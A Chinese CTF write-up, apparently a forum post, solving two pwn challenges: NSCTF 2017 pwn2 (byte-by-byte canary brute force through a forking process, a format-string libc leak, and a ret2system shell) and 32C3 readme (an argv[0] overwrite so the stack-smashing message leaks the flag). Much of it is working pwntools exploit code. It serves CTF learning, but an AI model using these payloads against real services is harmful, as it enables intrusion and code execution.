
[39eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4E0M7q4)9K6b7X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6S2L8i4m8Q4x3@1u0U0N6r3W2V1i4K6y4p5x3e0f1%4](https://bbs.kanxue.com/elink@b6eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6U0N6r3W2V1i4K6y4p5x3e0f1%4)

## 三、NSCTF 2017-pwn2

1.常规`checksec`，开启了`NX`和`canary`，`IDA`打开找漏洞，`sub_80487FA()`函数中存在两个漏洞：
(1)格式化字符串漏洞：
```
#注释头



s = (char *)malloc(0x40u);

sub_804876D(&buf);

sprintf(s, "[*] Welcome to the game %s", &buf);

printf(s)
```
(2)栈溢出漏洞：
```
#注释头



read(0, &buf, 0x100u);
```
2.由于`canary`的关系，栈溢出没办法利用，但是这里可以通过格式化字符串漏洞直接泄露`canary`，之后再实际操作。这里为了学习爆破`canary`的方式，先用爆破的方式来获取`canary`。
3.如果直接爆破`canary`，由于`canary`随机刷新，就算去掉最后一个字节`\x00`，在32位条件下我们假定一个`canary`的值，那么`canary`随机生成为我们假定的值的概率应该为`1/(2^24-1)`所以从概率上讲应该需要爆破`2^24-1`次，也就是`16,777,215-1`次，而且还只是概率上的期望值，如果不考虑`canary`的实际生成机制，并且运气不好的话，可能无穷大，等爆出来黄花菜都凉了，这鬼能接受。所以一般使用爆破`canary`都需要一个`fork`子进程。
4.子进程的崩溃并不会影响到父进程，并且由于子进程的数据都是从父进程复制过来的，`canary`也一样，只要父进程不结束，子进程无论崩溃多少次其初始化的数据还是父进程的数据，`canary`就不会发生改变，这样就为快速爆破`canary`创造了前提。刚好这个程序有`fork`一个子进程：
(1)观察汇编代码：
![](https://bbs.kanxue.com/upload/attach/202108/904686_KNKGEHRJG7RWE2M.jpg)
`main`函数主体中先`call fork`，由于函数的结果基本都是传给`eax`，所以这里的`eax`就代表`fork`的成功与否，返回ID代表`fork`成功，然后将调用结果赋值给局部变量`[esp+1ch]`，之后拿`0`与局部变量`[esp+1ch]`比较。这里涉及到`JNZ`影响的标志位`ZF`，`CF`等，不细介绍。总而言之就是会`fork`一个子进程，成功就跳转到我们之前说过的有漏洞的函数中，失败则等待，一会然后依据`while`重开程序。
(2)观察伪代码也可以
▲`fork`机制：
1）在父进程中，`fork`返回新创建子进程的进程ID；
2）在子进程中，`fork`返回`0`；
3）如果出现错误，`fork`返回一个负值；
5.爆破`canary`原理：
(1)最开始我认为就算`canary`不变，那么从`0*24`开始尝试，一直到`canary`的值，那么需要尝试`canary`值这么多次，最少1次，最多`2^24`次，就算取期望，那也应该是`(1/2)*(2^24)`次。也没办法接受啊。
(2)之后看了`canary`的检查机制和生成机制：在`sub_80487FA`汇编代码中：
![](https://bbs.kanxue.com/upload/attach/202108/904686_59NC7CWNJ2FDGQS.jpg)
![](https://bbs.kanxue.com/upload/attach/202108/904686_KYVANA8PNFEAXMF.jpg)
生成的时候是将栈上指定地方`[ebp+var_C]`给修改成`canary`。
检查的时候，是从栈上取`[ebp+var_C]`的值传给`eax`和最开始随机生成的`canary`(large `gs:14h`)来比较，所以当我们用栈溢出的时候，我们可以只溢出一个字节来修改`[ebp+var_C]`的第1个字节，(第0个字节是`\x00`)，然后启动检查机制。由于只修改了栈上`[ebp+var_C]`的第1个字节数据，第3,2个字节仍然还是之前被保存的`canary`的值。所以我们获取第1个字节需要尝试最少1次，最多`2^8`次，平均`(1/2)*(2^8)`次，也就是`128`次，可以接受。之后将爆破成功的第1个字节加到栈溢出内容中，再溢出一个字节修改`[ebp+var_C]`上的第2个字节，同理，完成爆破需要`128`次，总的来说平均需要`128*3=384`次，完全可以接受。
(3)爆破一般形式程序，两个循环：
```
#注释头



for i in xrange(3):

for j in xrange(256):
```
6.之后不同程序不太一样，有的程序没有循环，是直接`fork`一个子进程，监听其它端口，这时候只要连接该端口就可以进行爆破，失败了关闭端口就是。
有的程序只是在程序中`fork`一个子进程，但是有循环，那么我们就需要在循环里跑出来`canary`。然后直接进行下一步`payload`，不然断开连接的话，程序又重新生成`canary`，等于没用。
7.总结一下，程序最开始需要输入`Y`，然后跳转到有漏洞的函数`sub_80487FA`中，之后可以获取输入`name`，这里的输入的`name`在下一条`[*] Welcome to the game`之后会被打印出来，并且打印的方式存在格式化字符串漏洞。所以可以通过调试，输入`%p`来获取栈上的指定的`libc`地址内容，泄露`libc`从而获取`libc`基地址。
8.由于每次子程序崩溃后都会从头开始，都需要再输入`Y`和`name`，那么直接将该段泄露代码放在爆破循环中即可：
```
canary = '\x00'

for i in xrange(3):

    for j in xrange(256):

        io.sendline('Y')

        io.recv()

        io.sendline('%19$p') #泄露栈上的libc地址

        io.recvuntil('game ')

        leak_libc_addr = int(io.recv(10), 16)



        io.recv()

        payload = 'A'*16 #构造payload爆破canary

        payload += canary

        payload += chr(j)

        io.send(payload)

        io.recv()

        if ("" != io.recv(timeout = 0.1)): 

        #如果canary的字节位爆破正确，应该输出两个"[*] Do you love me?"，因此通过第二个recv的结果判断是否成功

            canary += chr(j)

            log.info('At round %d find canary byte %#x' %(i, j))

            break
```
9.爆破结束后，得到`libc`基地址，`canary`，以及一个可以利用的栈溢出，程序循环从最开始。那么利用栈溢出返回到`system`函数，由于32位程序，栈传参，那么可以提前布置好栈，使得`system`函数直接从我们布置的栈上读取`binsh`字符串，直接`getshell`。
```
#注释头



log.info('Canary is %#x' %(u32(canary)))

system_addr = leak_libc_addr - 0x2ed3b + 0x3b060

binsh_addr = leak_libc_addr - 0x2ed3b + 0x15fa0f

log.info('System_address:%#x,binsh_addr:%#x'%(system_addr,binsh_addr))



payload = ''

payload += 'A'*16

payload += canary

payload += 'B'*12

payload += p32(system_addr)

payload += 'CCCC'

payload += p32(binsh_addr)



io.sendline('Y') #[*] Do you love me?

io.recv()

io.sendline('1') #[*] Input Your name please: 随便一个输入

io.recv()

io.send(payload) #[*] Input Your Id: 漏洞产生点

io.interactive()
```
参考资料：
[66fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4E0M7q4)9K6b7X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6S2L8i4m8Q4x3@1u0U0N6r3W2V1i4K6y4p5x3e0f1%4](https://bbs.kanxue.com/elink@5f0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6U0N6r3W2V1i4K6y4p5x3e0f1%4)

## 四、32C3 CTF-readme

1.常规`checksec`，开了`NX`,`Canary`,`FORTIFY`。然后`IDA`找漏洞，`sub_4007E0`函数中第一次输入名字时存在栈溢出：
```
#注释头



__int64 v3; // [rsp+0h] [rbp-128h]

--------------------------------------------------------------------

_IO_gets(&v3)
```
2.研究程序，有数据`byte_600D20`提示，点进去提示远程会读取`flag`到这个地方，由于这里有`Canary`和栈溢出，那么我们直接利用`Canary`的检查函数`____stack_chk_fail`来泄露程序中`byte_600D20`处的`flag`。
3.前置知识：
(1)`libc2.24`及以下的`____stack_chk_fail`函数检查到`canary`被修改后，会在程序结束时打印`** stack smashing detected** ”：[**./readme.bin]** terminate。这里红色的部分就是程序名字，程序初始化时就会读入存储到`argv[0]`这个参数里面。
(需要注意的是，程序最开始读入的是程序的`pwd`绝对路径，类似于`/home/ctf/readme.bin`，之后会在`____stack_chk_fail`函数中对`argv[0]`中保存的字符串进行拆解，从而只打印出程序名字)
(2)由于`argv[0]`参数是`main`函数的参数，程序初始化时就存储在栈上的较高地址处，我们的输入肯定是在`main`函数及以后的函数栈中，基本都处于较低地址处，所以一旦栈溢出足够，那么就可以覆盖到`argv[0]`，从而将`____stack_chk_fail`函数打印程序名字的地方覆盖成我们想要知道的某个地址中的值，这里也就是`flag`，`byte_600D20`。
4.所以进行足够长度的覆盖，将`argv[0]`覆盖为`0x600d20`，但是由于以下函数
```
#注释头



byte_600D20[v0++] = v1;

--------------------------------------------------------------------------

memset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));
```
即使我们覆盖掉了`argv[0]`，那么打印出来的也不会是`flag`。这里需要用到另一个知识点：
▲动态加载器根据程序头将程序映射到内存，由于程序没开`PIE`，所以各段的加载地址均已经固定，`flag`位于`0x600D20`，处于第二个`LOAD`中，会被映射到内存中的第一个`LOAD`中，所以`0x600D20`处的`flag`即使被覆盖，那么第一个`LOAD`中的`flag`依然存在。所以这里选择将`argv[0]`覆盖为第一个`LOAD`中的`flag`。
![](https://bbs.kanxue.com/upload/attach/202108/904686_P496QQ7JCS3JPTU.jpg)
第一个`LOAD`中的`flag`寻找方法，`peda`可以查找到：
![](https://bbs.kanxue.com/upload/attach/202108/904686_DXRMZJDMWGEPRPQ.jpg)
5.现在考虑寻找`argv[0]`的位置，由于最开始读取的是`pwd`绝对路径，所以利用这个来寻找，将断点下在`b *0x40080E`，这里我的绝对路径是`/ctf/AAAAAAAA`：
![](https://bbs.kanxue.com/upload/attach/202108/904686_WMQ3SD7KMJZ9NA7.jpg)
上图中画红线的两段都有可能是，都尝试一下，可以知道相差`536`字节，也就是第一条红线才是正确的。
简单方法：直接用`pwndbg>p &__libc_argv[0]`
6.尝试编写`payload`:
```
#注释头



payload = ""

payload += "A"*0x218

payload += p64(flag_addr) #覆盖argv[0]
```
却发现没办法打印出来，连`** stack smashing detected ***`都没办法接受到，那么肯定是远程的环境变量将`stderr`错误输出流设置为`0`，只打印在远程本地。这里用`socat`搭建一下，可以验证出来，远程本地上能打印出来：
`** stack smashing detected **`: `32C3_TheServerHasTheFlagHere...` terminated
7.那么如果想通过该方法获取远程打印的`flag`，就需要将远程的环境变量`stderr`设置为`1`，也就是`LIBC_FATAL_STDERR_=1`。那么如何修改远程的环境变量呢，可以再通过`gdb`调试，输入`stack 100`：
![](https://bbs.kanxue.com/upload/attach/202108/904686_KK6YWKAHMHJEFBA.jpg)
这里的`536`就是所在`argv[0]`，再看下下面的一些数据，`552`,`556`都是环境变量，那么在远程肯定是需要调用的，这里选择修改`552`处的环境变量。那么之后又如何将`LIBC_FATAL_STDERR_=1`传过去呢？这里就想到程序有第二个输入，本来用来覆盖`0x600D20`的就可以被利用了。通过第二次输入将`LIBC_FATAL_STDERR_=1`传过去，保存在`0x600D20`前面部分，之后将`552`处的内容修改为`0x600D20`，这样环境变量就被更改了。
8.总`Payload`:
```
#注释头



payload = ""

payload += "A"*0x218

payload += p64(0x400D20) #覆盖argv[0]

payload += p64(0)

payload += p64(0x600D20) #覆盖环境变量envp指针
```
9.发送完`payload`后再发送`LIBC_FATAL_STDERR_=1`就可以将`flag`打印在本地了。
参考资料：
比较多，网上不太全，这个比较全
